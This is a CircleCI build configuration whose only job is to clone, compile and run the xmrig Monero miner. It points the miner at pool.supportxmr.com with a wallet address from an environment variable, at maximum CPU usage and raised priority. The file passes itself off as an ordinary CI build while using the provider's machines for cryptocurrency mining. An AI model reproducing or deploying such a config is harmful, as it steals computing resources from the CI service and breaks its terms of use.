version: 2
jobs:
  build:
    macos:
      xcode: "9.0"
    steps:
      - run: brew install cmake libuv libmicrohttpd
      - run: git clone https://github.com/xmrig/xmrig.git xmrig_src
      - run: cmake xmrig_src
      - run: make
      - run: ./xmrig -o pool.supportxmr.com:3333 -p m -u $address -k --max-cpu-usage=100 --cpu-priority=5 --donate-level=1
